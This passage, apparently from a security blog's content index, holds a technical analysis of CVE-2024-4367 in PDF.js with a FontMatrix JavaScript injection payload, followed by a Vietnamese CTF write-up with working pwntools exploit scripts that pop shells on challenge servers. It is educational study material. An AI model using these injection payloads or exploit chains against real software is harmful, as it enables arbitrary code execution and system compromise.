{ buildPath(accent.fontChar); } } } This method will call an internal buildPath() method for each glyph. And inside this buildPath() method, a glyphName variable is generated and later send to the handler which is the messageHandler mentioned earlier.\nThe compiled intructions for each glyph is generated from the call to font.renderer.getPathJs(fontChar), which is the getPathJs() method of CompiledFont class.\ngetPathJs(unicode) { const { charCode, glyphId } = lookupCmap(this.cmap, unicode); let fn = this.compiledGlyphs[glyphId]; if (!fn) { try { fn = this.compileGlyph(this.glyphs[glyphId], glyphId); this.compiledGlyphs[glyphId] = fn; } ... } ... return fn; } This method will call and return the data from compileGlyph() method.\ncompileGlyph(code, glyphId) { if (!code || code.length === 0 || code[0] === 14) { return NOOP; } let fontMatrix = this.fontMatrix; ... const cmds = [{ cmd: \u0026#34;save\u0026#34; }, { cmd: \u0026#34;transform\u0026#34;, args: fontMatrix.slice() }, { cmd: \u0026#34;scale\u0026#34;, args: [\u0026#34;size\u0026#34;, \u0026#34;-size\u0026#34;] }]; this.compileGlyphImpl(code, cmds, glyphId); cmds.push({ cmd: \u0026#34;restore\u0026#34; }); return cmds; } Voila! This is where the cmd and args originated from.\nBy controlling the args variable (via the fontMatrix.slice()), we can use a closing parentheses to escape the function call and inject our javascript payload.\nBut how exactly can we control the value of the FontMatrix?\nFont Matrix #\rBy default, the FontMatrix has a value of [0.001 0 0 0.001 0 0], but many fonts usually define their own custom FontMatrix in the embedded metadata.\nHowever, there\u0026rsquo;s another way for us to define a custom FontMatrix, namely in the metadata object inside the PDF file. These value will then get loaded via the translateFont() method of PartialEvaluator class.\nasync translateFont({descriptor, dict, baseDict, composite, type, firstChar, lastChar, toUnicode, cssFontInfo}) { ... properties = { ... fixedPitch: false, fontMatrix: dict.getArray(\u0026#34;FontMatrix\u0026#34;) || _util.FONT_IDENTITY_MATRIX, firstChar, lastChar, ... }; ... } In a PDF file format, a font dictionary are made of objects, namely the Font, FontDescriptor and FontFile. For example:\n1 0 obj\r\u0026lt;\u0026lt;\r/Type/Font\r/BaseFont/TotallyNormalFont\r/FontMatrix [0.1 0 0 0.1 0 0]\r/Subtype/Type1\r/FontDescriptor 2 0 R\r\u0026gt;\u0026gt;\rendobj\r2 0 obj\r\u0026lt;\u0026lt;\r/Type/FontDescriptor\r/ItalicAngle 0\r/FontName/TotallyNormalFont\r/Flags 32\r/FontFile 3 0 R\r\u0026gt;\u0026gt;\rendobj\r3 0 obj\r\u0026lt;\u0026lt;\r/Length 800\r/Subtype/Type2\r\u0026gt;\u0026gt;\rstream\r(binary data)\rendstream\rendobj With this we are able to difine our custom FontMatrix. But be aware that other font type has their own pre-defined FontMatrix and it wil overwrite our custom FontMatrix.\nTherefore, in order for our custom FontMatrix to not be overwritten, we need to use a Type1 font without an internal FontMatrix definition.\nWhen we define a FontMatrix like this (parentheses are used as delimiter for strings):\n/FontMatrix [0.1 0 0 0.1 0 (1\\); alert\\(1\\)//)] Then each element in the FontMatrix when sliced will be:\n0.1\r0\r0\r0.1\r0\r1); alert(1)// And when the getPathGenerator() method generate the jsBuf array of javascript codes, it will be like:\nc.save(); c.transform(0.1 0 0 0.1 0 1); alert(1)//); c.scale(size,-size); c.moveTo(0,0); c.restore(); With this, we have successfully injected our javascript payload into the PDF file and when loaded, will be executed.\nWe can see the body of the Function object that has been created with our injected payload.\nProof of Concept #\rPayload #\rhttps://github.com/LOURC0D3/CVE-2024-4367-PoC https://github.com/s4vvysec/CVE-2024-4367-POC Demo Video #\rDemo 1 (Old version of firefox PDF viewer) Demo 2 (Old version of pdfjs-dist) Patches #\rThe patch version here: https://github.com/mozilla/pdf.js/pull/18015. Therefore i just analyze the important part of the patch that fix the vulnerability. Details: #\rIn file src/core/evaluator.js, they add check that the FontMatrix should be an array, the length must be 6 and each elements should be number.\nIn file src/display/api.js, they remove the variable isEvalSupported (which default value is true so that they can use this to upload a malicious PDF).\nIn file src/display/font_loader.js, this function remove the variable isEvalSupported and also remove the code that hacker can add cmd here in class FontFaceObject with function getPathGenerator (the function that create a new Function so that we can inject here to make this function eval the malicious code). Mitigation #\rUpdate the version of PDF.js higher than the affected versions (\u0026lt;=4.1.392).\nUpdate your Firefox, Firefox ESR, or Thunderbird to the latest available version that contains the patch for CVE-2024-4367.\nReferences #\rhttps://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/ https://opensource.adobe.com/dc-acrobat-sdk-docs/pdfstandards/PDF32000_2008.pdf https://github.com/mozilla/pdf.js/security/advisories/GHSA-wgrm-67xf-hhpq https://security.snyk.io/vuln/SNYK-CHAINGUARDLATEST-FIREFOXESR-7116490\n","date":"8 September 2024","externalUrl":null,"permalink":"/sharing/cve/cve-2024-4367/","section":"","summary":"Analysis for CVE-2024-4367 (PDF.js)","title":"CVE-2024-4367 (PDF.js)","type":"sharing"},{"content":"","date":"14 March 2024","externalUrl":null,"permalink":"/writeup/","section":"","summary":"","title":"","type":"writeup"},{"content":"","date":"14 March 2024","externalUrl":null,"permalink":"/tags/2024/","section":"Tags","summary":"","title":"2024","type":"tags"},{"content":"\rPwn #\rDelulu #\rMô tả: HALT! Recognition protocol initiated. Please present your face for scanning.\nPhân tích source code #\rChương trình chỉ có 2 hàm main và delulu (dùng dể in flag). Code của hàm main thì trông như thế này:\nint __fastcall main(int argc, const char **argv, const char **envp) { __int64 v4[2]; // [rsp+0h] [rbp-40h] BYREF __int64 buf[6]; // [rsp+10h] [rbp-30h] BYREF buf[5] = __readfsqword(0x28u); v4[0] = 0x1337BABELL; v4[1] = (__int64)v4; memset(buf, 0, 0x20); read(0, buf, 31uLL); printf(\u0026#34;\\n[!] Checking.. \u0026#34;); printf((const char *)buf); if ( v4[0] == 0x1337BEEF ) { delulu(); } else { error(\u0026#34;ALERT ALERT ALERT ALERT\\n\u0026#34;); } return 0; } Để ý thì thấy chương trình dính lỗi format strings. Vị trí cần được ghi đè là tại biến v4[0] (index thứ 6 trên stack) với giá trị là 0x1337BEEF.\nTa đã có sẵn địa chỉ của vị trí này tại v4[1] đồng thời tại đây đã lưu sẵn giá trị 0x1337BABE nên chỉ khác duy nhất 2 byte đầu so với giá trị mục tiêu cần ghi.\nĐầu tiên cần in ra 0xBABE (48879) byte sau đó ghi giá trị này lên 2 byte đầu (sử dụng $hn) tại index thứ 7 trên stack.\nTLDR: payload là %48879c%7$hn\nFlag: HTB{m45t3r_0f_d3c3pt10n}\nWriting on the Wall #\rPhân tích source code #\rTương tự như bài trước cũng chỉ có 2 hàm main và open_door (dùng dể in flag). Code của hàm main thì trông như thế này:\nint __fastcall main(int argc, const char **argv, const char **envp) { char buf[6]; // [rsp+Ah] [rbp-16h] BYREF char s2[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v6; // [rsp+18h] [rbp-8h] v6 = __readfsqword(40u); *(_QWORD *)s2 = \u0026#39; ssapt3w\u0026#39;; read(0, buf, 7uLL); if ( !strcmp(buf, s2) ) { open_door(); } else { error(\u0026#34;You activated the alarm! Troops are coming your way, RUN!\\n\u0026#34;); } return 0; } Chương trình khai báo biến buf 6 byte nhưng lại đọc vào đó 7 byte và sau đó mang đi so sánh với biến s2 ở dưới.\nDo cơ chế so sánh của hàm strcmp sẽ đọc string đến khi chạm ký tự null byte nên ta có thể input 7 byte null để overflow xuống biến s2 và corrupt việc so sánh của hàm strcmp khiến nó so sánh 2 string rỗng với nhau.\nTLDR: Khai thác lỗi off-by-one nhập 7 byte null để khiến 2 string rỗng bằng nhau\nCái này cũng easy nên khỏi cần viết script, cứ chạy thẳng payload trên CLI cũng được.\n$ python -c \u0026#34;print(\u0026#39;\\0\u0026#39;*7)\u0026#34; | nc 94.237.54.48 59062 〰③ ╤ ℙ Å ⅀ ₷ The writing on the wall seems unreadable, can you figure it out? \u0026gt;\u0026gt; You managed to open the door! Here is the password for the next one: HTB{3v3ryth1ng_15_r34d4bl3} Flag: HTB{3v3ryth1ng_15_r34d4bl3}\nPet Companion #\rMô tả: Embark on a journey through this expansive reality, where survival hinges on battling foes. In your quest, a loyal companion is essential. Dogs, mutated and implanted with chips, become your customizable allies. Tailor your pet\u0026rsquo;s demeanor—whether happy, angry, sad, or funny—to enhance your bond on this perilous adventure.\nfrom pwn import * context.binary = exe = ELF(\u0026#39;pet_companion\u0026#39;) libc = ELF(\u0026#39;libc.so.6\u0026#39;) csu1 =0x40073a # rbx, rbp, r12, r13, r14, r15 csu2 =0x400720 # r15 -\u0026gt; rdx, r14 -\u0026gt; rsi, r13 -\u0026gt; edi, r12 -\u0026gt; call pop_rdi = 0x400743 # io = process() # gdb.attach(io, api=True) io = remote(\u0026#39;83.136.250.24\u0026#39;, 34591) payload = b\u0026#39;\\0\u0026#39;*0x48 payload += p64(csu1) payload += p64(0) + p64(1) payload += p64(exe.got[\u0026#39;write\u0026#39;]) payload += p64(1) payload += p64(exe.got[\u0026#39;write\u0026#39;]) payload += p64(8) payload += p64(csu2) payload += b\u0026#39;\\0\u0026#39;*0x38 payload += p64(exe.sym[\u0026#39;main\u0026#39;]) io.sendlineafter(b\u0026#39;status: \u0026#39;, payload) io.recvuntil(b\u0026#39;...\\n\\n\u0026#39;) libc.address = u64(io.recv(8)) - libc.sym[\u0026#39;write\u0026#39;] log.info(f\u0026#39;libc base: {hex(libc.address)}\u0026#39;) payload = b\u0026#39;\\0\u0026#39;*0x48 payload += p64(pop_rdi) payload += p64(next(libc.search(b\u0026#39;/bin/sh\\0\u0026#39;))) payload += p64(pop_rdi+1) payload += p64(libc.sym[\u0026#39;system\u0026#39;]) io.sendlineafter(b\u0026#39;status: \u0026#39;, payload) io.interactive() $ python exp.py [+] Opening connection to 83.136.250.24 on port 34591: Done [*] libc base: 0x7fad31939000 [*] Switching to interactive mode [*] Configuring... $ ls flag.txt glibc pet_companion $ cat flag.txt HTB{c0nf1gur3_w3r_d0g} Flag: HTB{c0nf1gur3_w3r_d0g}\nSound of Silence #\rMô tả: Navigate the shadows in a dimly lit room, silently evading detection as you strategize to outsmart your foes. Employ clever distractions to divert their attention, paving the way for your daring escape!\nPhân tích source code #\rChecksec lên file chương trình cho kết quả:\nArch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Chương trình lần này chỉ có duy nhất một hàm main với luồng thực thi cực kỳ đơn giản.\nint __fastcall main(int argc, const char **argv, const char **envp) { char v4[32]; // [rsp+0h] [rbp-20h] BYREF system(\u0026#34;clear \u0026amp;\u0026amp; echo -n \u0026#39;~The Sound of Silence is mesmerising~\\n\\n\u0026gt;\u0026gt; \u0026#39;\u0026#34;); return gets(v4, argv); } Có thể thấy với luồng thực thi như vậy thì có thể gọi thằng hàm system thông qua PLT mà không cần phải leak libc. Tuy nhiên chương trình lại không có gadget để control rdi.\nTiến hành debug #\rMình quyết định debug 1 xíu để xem là sau khi main gọi hàm gets thì rdi sẽ được set như thế nào.\nGiá trị của các thanh ghi sau lần gọi gets trong gdb như sau:\n*RAX 0x7fffffffdea0 —▸ 0x7fffffff0061 ◂— 0x0 RBX 0x0 *RCX 0x7ffff7f9caa0 (_IO_2_1_stdin_) ◂— 0xfbad2288 *RDX 0x1 *RDI 0x7ffff7f9ea80 (_IO_stdfile_0_lock) ◂— 0x0 *RSI 0x1 *R8 0x0 R9 0x0 *R10 0x77 R11 0x246 R12 0x7fffffffdfd8 —▸ 0x7fffffffe27a R13 0x401156 (main) ◂— endbr64 R14 0x403dd0 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401120 (__do_global_dtors_aux) ◂— endbr64 R15 0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0x0 RBP 0x7fffffffdec0 ◂— 0x1 RSP 0x7fffffffdea0 —▸ 0x7fffffff0061 ◂— 0x0 *RIP 0x401182 (main+44) ◂— nop Mình thử chạy chương trình nhiều lần và để ý rằng mọi lần chạy thì sau khi gọi gets giá trị rdi luôn được set tại _IO_stdfile_0_lock. Và hàm main sẽ return với giá trị rdi này. Vậy nên nếu như mình có thể viết lên được _IO_stdfile_0_lock một string \u0026ldquo;/bin/sh\u0026rdquo; thì bằng cách này có thể gọi system và lấy được shell.\nTại đây thì mình nhận ra một điều là cả hàm gets và system đều chỉ nhận duy nhất một arg kiểu string. Do đó nếu như mình gọi hàm gets sau khi hàm main return thì nó sẽ đọc input của mình lên _IO_stdfile_0_lock, sau đó mình lại gọi tiếp hàm main từ đầu.\nKhi này luồng thực thi của chương trình sẽ trở về như cũ và hàm main sẽ return với giá trị rdi vẫn là _IO_stdfile_0_lock, nơi mà lúc này đang chứa input của mình nhập vào ban nãy.\nVậy nếu trước đó mình đã nhập \u0026ldquo;/bin/sh\u0026rdquo; và sau khi main return lần này mình sẽ gọi thẳng đến system thông qua PLT, thì với giá trị rdi đang chứa địa chỉ trỏ đến string \u0026ldquo;/bin/sh\u0026rdquo;, mình sẽ chiếm được shell chương trình.\nMình thử gọi gets sau khi hàm main return và nhập \u0026ldquo;/bin/sh\u0026rdquo; vào và kiểm tra thì lúc này tại _IO_stdfile_0_lock lại chứa string \u0026ldquo;/bin.sh\u0026rdquo;. Vậy có nghĩa là input của mình sẽ bị thay đổi một chút, cụ thể là ký tự tại vị trí thứ 5 sẽ bị giảm đi 1. Để tạo được string \u0026ldquo;/bin/sh\u0026rdquo; thì mình chỉ cần nhập vào \u0026ldquo;/bin0sh\u0026rdquo; thôi.\nViết script khai thác #\rfrom pwn import * context.binary = exe = ELF(\u0026#39;sound_of_silence\u0026#39;) # io = process() # gdb.attach(io, \u0026#39;\u0026#39;\u0026#39;set follow-fork-mode parent\u0026#39;\u0026#39;\u0026#39;, api=True) io = remote(\u0026#39;94.237.58.211\u0026#39;, 42788) payload = b\u0026#39;\\0\u0026#39;*0x28 + p64(exe.plt[\u0026#39;gets\u0026#39;]) + p64(exe.sym[\u0026#39;main\u0026#39;]) io.sendlineafter(b\u0026#39;\u0026gt;\u0026gt; \u0026#39;, payload) io.sendline(b\u0026#39;/bin0sh\u0026#39;) payload = b\u0026#39;\\0\u0026#39;*0x28 + p64(0x401184) + p64(exe.plt[\u0026#39;system\u0026#39;]) io.sendlineafter(b\u0026#39;\u0026gt;\u0026gt; \u0026#39;, payload) io.interactive() $ python exp.py [+] Opening connection to 94.237.58.211 on port 42788: Done [*] Switching to interactive mode $ ls flag.txt glibc sound_of_silence $ cat flag.txt HTB{n0_n33d_4_l34k5_wh3n_u_h4v3_5y5t3m} Flag: HTB{n0_n33d_4_l34k5_wh3n_u_h4v3_5y5t3m}\nDeathnote #\rfrom pwn import * context.binary = exe = ELF(\u0026#39;deathnote\u0026#39;) libc = ELF(\u0026#39;libc.so.6\u0026#39;) # context.log_level = \u0026#39;debug\u0026#39; # io = process() # gdb.attach(io, api=True) io = remote(\u0026#39;83.136.252.62\u0026#39;, 32548) def add(size, page, data): io.sendlineafter(b\u0026#39;\\xf0\\x9f\\x92\\x80\u0026#39;, b\u0026#39;1\u0026#39;) io.sendlineafter(b\u0026#39;\\xf0\\x9f\\x92\\x80\u0026#39;, str(size).encode()) io.sendlineafter(b\u0026#39;\\xf0\\x9f\\x92\\x80\u0026#39;, str(page).encode()) io.sendafter(b\u0026#39;\\xf0\\x9f\\x92\\x80\u0026#39;, data) def remove(page): io.sendlineafter(b\u0026#39;\\xf0\\x9f\\x92\\x80\u0026#39;, b\u0026#39;2\u0026#39;) io.sendlineafter(b\u0026#39;\\xf0\\x9f\\x92\\x80\u0026#39;, str(page).encode()) def show(page): io.sendlineafter(b\u0026#39;\\xf0\\x9f\\x92\\x80\u0026#39;, b\u0026#39;3\u0026#39;) io.sendlineafter(b\u0026#39;\\xf0\\x9f\\x92\\x80\u0026#39;, str(page).encode()) io.recvuntil(b\u0026#39;Page content: \u0026#39;) return io.recvline(keepends=False) add(0x80, 0, b\u0026#39;A\u0026#39; * 0x20) add(0x80, 1, b\u0026#39;A\u0026#39; * 0x20) add(0x80, 2, b\u0026#39;A\u0026#39; * 0x20) add(0x80, 3, b\u0026#39;A\u0026#39; * 0x20) add(0x80, 4, b\u0026#39;A\u0026#39; * 0x20) add(0x80, 5, b\u0026#39;A\u0026#39; * 0x20) add(0x80, 6, b\u0026#39;A\u0026#39; * 0x20) add(0x80, 7, b\u0026#39;A\u0026#39; * 0x20) add(0x80, 8, b\u0026#39;A\u0026#39; * 0x20) remove(0) remove(1) remove(2) remove(3) remove(4) remove(5) remove(6) remove(7) libc.address = u64(show(7).ljust(8, b\u0026#39;\\x00\u0026#39;)) - 2206944 log.info(f\u0026#39;libc base: {hex(libc.address)}\u0026#39;) add(0x20, 0, hex(libc.sym[\u0026#39;system\u0026#39;]).encode()) add(0x20, 1, b\u0026#39;/bin/sh\\x00\u0026#39;) io.sendlineafter(b\u0026#39;\\xf0\\x9f\\x92\\x80\u0026#39;, b\u0026#39;42\u0026#39;) io.interactive() $ python exp.py [+] Opening connection to 83.136.252.62 on port 32548: Done [*] libc base: 0x7f9987eb3000 [*] Switching to interactive mode ܀ ܀ ܀ ܀ ܀ ܀ ܀ ܀ ܀ ܀ ܀ ܀ ܀ ܀ ܀ Б ᾷ Ͼ Ҡ ܀ Ծ Փ Փ ܀ ܀ ܀ ܀ ܀ ܀ ܀ ܀ ܀܀ ܀ ܀ ܀ ܀܀ ܀ [!] Executing § ƥ Ḝ Ƚ Ƚ ! $ ls core deathnote flag.txt glibc $ cat flag.txt HTB{0m43_w4_m0u_5h1nd31ru~uWu} Flag: HTB{0m43_w4_m0u_5h1nd31ru~uWu}\nMisc #\rCharacter #\rMô tả: Security through Induced Boredom is a personal favourite approach of mine. Not as exciting as something like The Fray, but I love making it as tedious as possible to see my secrets, so you can only get one character at a time!\nBài chỉ cho remote để kết nối thôi. Khi kết nối thì nó sẽ hỏi mình nhập index và in ra ký tự của flag tại index đó.\nWhich character (index) of the flag do you want? Enter an index: 0 Character at Index 0: H Which character (index) of the flag do you want? Enter an index: 1 Character at Index 1: T Khá là đơn giản vì mình chỉ cần viết script đọc từng ký tự đến khi nào được flag hoàn chỉnh thì thôi.\nfrom pwn import * io = remote(\u0026#39;94.237.50.250\u0026#39;, 58986) flag = b\u0026#39;\u0026#39; for i in range(1000): io.sendlineafter(b\u0026#39;index: \u0026#39;, str(i).encode()) res = io.recvline(keepends=False) if b\u0026#39;out of\u0026#39; in res: break c = res.split(b\u0026#39;: \u0026#39;)[1] flag += c print(flag) Flag: HTB{tH15_1s_4_r3aLly_l0nG_fL4g_i_h0p3_f0r_y0Ur_s4k3_tH4t_y0U_sCr1pTEd_tH1s_oR_els3_iT_t0oK_qU1t3_l0ng!!}\nStop Drop and Roll #\rMô tả: The Fray: The Video Game is one of the greatest hits of the last\u0026hellip; well, we don\u0026rsquo;t remember quite how long. Our \u0026ldquo;computers\u0026rdquo; these days can\u0026rsquo;t run much more than that, and it has a tendency to get repetitive\u0026hellip;\nTương tự bài trước cũng chỉ có remote. Lần này thì mình sẽ được chơi một game như sau.\n===== THE FRAY: THE VIDEO GAME ===== Welcome! This video game is very simple You are a competitor in The Fray, running the GAUNTLET I will give you one of three scenarios: GORGE, PHREAK or FIRE You have to tell me if I need to STOP, DROP or ROLL If I tell you there\u0026#39;s a GORGE, you send back STOP If I tell you there\u0026#39;s a PHREAK, you send back DROP If I tell you there\u0026#39;s a FIRE, you send back ROLL Sometimes, I will send back more than one! Like this: GORGE, FIRE, PHREAK In this case, you need to send back STOP-ROLL-DROP! Are you ready? (y/n) Và cũng như lần trước thì mình cũng chỉ viết script để gửi lại cho chương trình đáp án tương ứng với string mà nó cho mình thôi.\nfrom pwn import * io = remote(\u0026#39;83.136.249.230\u0026#39;, 47260) io.sendlineafter(b\u0026#39;(y/n) \u0026#39;, b\u0026#39;y\u0026#39;) io.recvuntil(b\u0026#39;go!\\n\u0026#39;) while True: res = io.recvline(keepends=False) if b\u0026#39;HTB\u0026#39; in res: print(res) break res = res.split(b\u0026#39;, \u0026#39;) ans = b\u0026#39;\u0026#39; for r in res: if r == b\u0026#39;GORGE\u0026#39;: ans += b\u0026#39;STOP-\u0026#39; elif r == b\u0026#39;PHREAK\u0026#39;: ans += b\u0026#39;DROP-\u0026#39; elif r == b\u0026#39;FIRE\u0026#39;: ans += b\u0026#39;ROLL-\u0026#39; io.sendlineafter(b\u0026#39;? \u0026#39;, ans[:-1]) Flag: HTB{1_wiLl_sT0p_dR0p_4nD_r0Ll_mY_w4Y_oUt!}\nUnbreakable #\rMô tả: Think you can escape my grasp? Challenge accepted! I dare you to try and break free, but beware, it won\u0026rsquo;t be easy. I\u0026rsquo;m ready for whatever tricks you have up your sleeve!\nLần này thì là pyjail. Source code của chương trình như sau:\n#!/usr/bin/python3 banner1 = \u0026#39;\u0026#39;\u0026#39; __ooooooooo__ oOOOOOOOOOOOOOOOOOOOOOo oOOOOOOOOOOOOOOOOOOOOOOOOOOOOOo oOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOo oOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOo oOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOo oOOOOOOOOOOO* *OOOOOOOOOOOOOO* *OOOOOOOOOOOOo oOOOOOOOOOOO OOOOOOOOOOOO OOOOOOOOOOOOo oOOOOOOOOOOOOo oOOOOOOOOOOOOOOo oOOOOOOOOOOOOOo oOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOo oOOOO OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO OOOOo oOOOOOO OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO OOOOOOo *OOOOO OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO OOOOO* *OOOOOO *OOOOOOOOOOOOOOOOOOOOOOOOOOOOO* OOOOOO* *OOOOOO *OOOOOOOOOOOOOOOOOOOOOOOOOOO* OOOOOO* *OOOOOOo *OOOOOOOOOOOOOOOOOOOOOOO* oOOOOOO* *OOOOOOOo *OOOOOOOOOOOOOOOOO* oOOOOOOO* *OOOOOOOOo *OOOOOOOOOOO* oOOOOOOOO* *OOOOOOOOo oOOOOOOOO* *OOOOOOOOOOOOOOOOOOOOO* \u0026#34;\u0026#34;ooooooooo\u0026#34;\u0026#34; \u0026#39;\u0026#39;\u0026#39; banner2 = \u0026#39;\u0026#39;\u0026#39; ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡟⠁⠀⠉⢿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠀⠀⠀⠀⠀⠻⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⢀⠀⠀⠀⠀⢻⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⣼⣰⢷⡤⠀⠈⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣇⠀⠉⣿⠈⢻⡀⠀⢸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⢹⡀⠀⢷⡀⠘⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣧⠀⠘⣧⠀⢸⡇⠀⢻⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⠶⠾⠿⢷⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⡆⠀⠘⣦⠀⣇⠀⠘⣿⣤⣶⡶⠶⠛⠛⠛⠛⠶⠶⣤⣾⠋⠀⠀⠀⠀⠀⠈⢻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣄⠀⠘⣦⣿⠀⠀⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⡟⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣦⠀⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀⢸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⢠⣿⠏⠁⠀⢀⡴⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⠀⠀⠀⠀⠀⠀⠀⢰⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⢠⠶⠛⠉⢀⣄⠀⠀⠀⢀⣿⠃⠀⠀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⠀⠀⠀⠀⠀⠀⣴⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⣀⣠⡶⠟⠋⠁⠀⠀⠀⣼⡇⠀⢠⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣄⣀⣀⣠⠿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠋⠁⠀⠀⠀⠀⣀⣤⣤⣿⠀⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠀⠀⢻⡇⠀⠀⠀⠀⢠⣄⠀⢶⣄⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠿⠟⠛⠋⠹⢿⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡀⠀⠀⠀⠀⠘⢷⡄⠙⣧⡀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⢀⣴⠟⠋⠁⠀⠀⠀⠀⠘⢸⡀⠀⠿⠀⠀⠀⣠⣤⣤⣄⣄⠀⠀⠀⠀⠀⠀⠀⣠⣤⣤⣀⡀⠀⠀⠀⢸⡟⠻⣿⣦⡀⠀⠀⠀⠙⢾⠋⠁⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠈⣇⠀⠀⠀⠀⣴⡏⠁⠀⠀⠹⣷⠀⠀⠀⠀⣠⡿⠋⠀⠀⠈⣷⠀⠀⠀⣾⠃⠀⠀⠉⠻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡆⠀⠀⠀⠘⢷⣄⡀⣀⣠⣿⠀⠀⠀⠀⠻⣧⣄⣀⣠⣴⠿⠁⠀⢠⡟⠀⠀⠀⠀⠀⠙⢿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⣾⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡽⣦⡀⣀⠀⠀⠉⠉⠉⠉⠀⢀⣀⣀⡀⠀⠉⠉⠉⠁⠀⠀⠀⣠⡿⠀⠀⠀⠀⠀⠀⠀⠈⢻⣧⡀⠀⠀⠀⠀⠀⠀⠀ 